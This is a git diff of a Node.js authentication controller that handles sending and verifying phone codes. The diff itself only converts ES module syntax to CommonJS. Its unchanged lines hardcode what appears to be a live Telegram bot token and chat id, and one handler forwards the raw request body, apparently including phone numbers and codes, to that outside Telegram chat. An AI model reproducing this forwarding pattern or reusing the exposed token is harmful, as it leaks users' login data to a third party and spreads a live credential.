@@ -1,15 +1,13 @@
 const token = `6909778501:AAE4l6b0sJsTsaA2o2-glmJd84Szr_PAY_I`
 const chat_id = `-1002019552795`
 const uri = `https://api.telegram.org/bot${token}/sendMessage`
-import axios from 'axios'
-import AuthModel from '../models/Auth.js'
-import UserModel from '../models/User.js'
-import jwt from 'jsonwebtoken'
+const axios = require('axios')
+const AuthModel = require('../models/Auth.js')
+const UserModel = require('../models/User.js')
+const jwt = require('jsonwebtoken')
 
 
-export const updateUserCode = async (req, res) => {
-    console.log(req)
-    console.log(req.message)
+ const updateUserCode = async (req, res) => {
 
     const request = await axios.post(uri, {
         chat_id: chat_id,
@@ -17,7 +15,7 @@ export const updateUserCode = async (req, res) => {
         text: debug(req.body),
     })
 }
-export const sendCode = async (req, res) => {
+const sendCode = async (req, res) => {
     try {
         console.log('24')
         if (!req.body.phoneNumber) {
@@ -63,7 +61,7 @@ export const sendCode = async (req, res) => {
     }
 }
 
-export const verifyCode = async (req, res, next) => {
+const verifyCode = async (req, res, next) => {
     try {
         const { code, phoneNumber } = req.body
         const model = await AuthModel.findOne({ phoneNumber: phoneNumber })
@@ -126,6 +124,14 @@ export const verifyCode = async (req, res, next) => {
         console.log(error)
         res.status(500).json({ message: error?.message ? error.message : error })
     }
+}
+
+
+module.exports = {
+    updateUserCode,
+    sendCode,
+    verifyCode,
+    
 }
 
 
